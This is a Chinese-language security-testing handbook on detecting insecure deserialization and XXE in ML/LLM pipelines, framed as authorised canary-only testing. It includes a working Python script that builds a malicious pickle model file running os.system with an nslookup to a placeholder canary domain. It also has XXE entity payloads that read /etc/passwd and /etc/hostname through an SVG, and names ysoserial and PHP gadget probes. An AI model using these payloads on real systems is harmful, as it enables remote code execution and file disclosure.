# Detection 手册：反序列化与 XXE（× ML/LLM 管道特化）

> 模式参照 GCP reference-harness（github.com/GoogleCloudPlatform/reference-harness，仅 3 commits——**借模式不依赖代码**）。
> RoE：全部测试在 `scope-gate` 授权门内；RCE 级验证只用 DNS/HTTP canary（URLDNS 型无副作用探针），真实命令执行不在授权外目标做。
> 对齐本集群既有技能：`deserialization-xxe`（Java/PHP/Python/.NET 全栈专项）——本手册是 ML 管道/LLM 应用切片。

## ML/LLM 系统的特殊反序列化面

1. **pickle 权重加载**（最高频）：PyTorch `.pt/.pth/.bin`、`.ckpt`、joblib `.joblib`、numpy `.npy/.npz`（allow_pickle=True 时）——`torch.load()` / `pickle.load()` 默认执行 `__reduce__`。**agent 清单 AI-MDL-001 锚点：权重加载路径 pickle 反序列化 RCE**（v1.5 节 92 Critical 头部案例）。入口：模型 hub 下载、用户上传模型/LoRA 适配器、共享对象存储、模型市场。
2. **记忆/会话持久化**：agent 记忆模块若用 pickle/zip 对象流持久化，记忆投毒（ASI06）与反序列化 RCE 在同一载体交汇。
3. **消息队列对象**：任务队列用裸 pickle 序列化任务体（Celery 默认序列化历史问题）。
4. **XML 解析（XXE）**：SVG 头像/文档预览、OOXML（docx/xlsx）解析、SAML/SOAP 端点、RSS/sitemap 摄入（与 RAG 摄入链交汇）。
5. **safetensors 对照**：`.safetensors` 格式不执行代码——目标是否强制 safetensors / `weights_only=True` 是对照锚点（PyTorch 新版 `torch.load` 默认值迁移方向）。

## 测试矩阵

| # | 测试项 | 手法 | 判定锚 |
|---|--------|------|--------|
| D1 | pickle canary（Python） | `__reduce__` 触发 DNS/HTTP 回调的 `.pt`/`.joblib` 文件上传 | canary 命中 = Confirmed |
| D2 | 权重加载路径审查 | 白盒：grep `torch.load(`/`pickle.load(`/`joblib.load(`/`allow_pickle`；黑盒：上传后观察加载行为 | file:line 证据 |
| D3 | Java gadget | `ysoserial` URLDNS 探针（哪个 gadget 命中记哪个） | DNS canary |
| D4 | PHP gadget | Phar/`__wakeup`/`__destruct` 链探针 | 回调 |
| D5 | XXE 经典 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`（SVG/OOXML/SAML） | 响应含文件内容 |
| D6 | XXE OOB（blind） | 外部 DTD + `<!ENTITY % …>` 参数实体外带 | canary 收到数据 |
| D7 | 记忆持久化投毒 | 往记忆载体写 pickle 载荷（授权测试实例） | 重启/加载后回调 |
| D8 | numpy `.npy` allow_pickle | 带 `__reduce__` 的 npy 上传（`np.load(..., allow_pickle=True)` 才执行） | canary |

## 命令示例

```bash
# D1：Python pickle canary 权重文件生成（无副作用 DNS 探针）
python3 - <<'PY'
import pickle, io
class P:
    def __reduce__(self):
        import os
        return (os.system, ('nslookup <canary-domain>',))
# 伪装成 PyTorch 权重文件结构：zip 包裹 data.pkl（PyTorch 格式 = zip 内含 data.pkl）
with open('canary.pt','wb') as f:
    pickle.dump(P(), f)
print('canary.pt written — 上传至授权目标模型入口并触发加载')
PY

# D5：SVG XXE 探针（上传为头像/文档预览）
# <?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
# <svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="10">&xxe;</text></svg>
```

## 判定标准

- **Confirmed（OOB）**：canary 域收到回调（D1/D3/D4/D6/D7/D8），或 D5 响应直接回显文件内容。
- **可达性门槛（D2 白盒）**：`torch.load()` 存在 ≠ 漏洞——必须证明**攻击者可控的文件**能走到该调用（上传→存储→加载链完整）。只有静态调用点 = Candidate，标「需数据流确认」。
- D3 逐 gadget 记录命中者（URLDNS→探测依赖版本→定制回显），不笼统写「Java 反序列化存在」。
- 命中后 RCE 定级按**加载进程的权限**（容器 root 与否、挂载范围），不按 gadget 复杂度。

## 证据要求

- canary 域回调记录（时间/来源 IP/查询串）+ 上传物 sha256；
- 白盒 D2 附 `file:line` + 数据流说明（入口→存储→加载）；
- RCE 类发现不贴回显命令全文，canary 路径即证据（金丝雀纪律）。

## 常见误报（fp-check 对接）

- **静态文件含 pickle 但从不加载**：上传目录只做病毒扫描不反序列化——数据流不可达即误报（本手册可达性门槛）。
- **safetensors 路径**：目标已用 `.safetensors`/`weights_only=True` 时，pickle 探针无效是**设计正确**，记录为防护对照而非漏测。
- XXE 被解析器默认禁用（现代 libxml2/lxml 默认 no_network/禁外部实体）——换解析器入口复测再下结论；全部入口安全才可写防护有效。
- numpy `.npy` 默认 `allow_pickle=False`——只有显式开启才有 D8。

## 框架映射

OWASP LLM03（供应链·ML 管道上游）/ LLM04（模型投毒族边界：投毒是内容层、反序列化是执行层，分开计）/ ASI04（agentic 供应链）/ ASI05（意外代码执行）；agentic 清单 AI-MDL-001（权重加载 RCE）；CWE-502（反序列化不可信数据）/ CWE-611（XXE）。
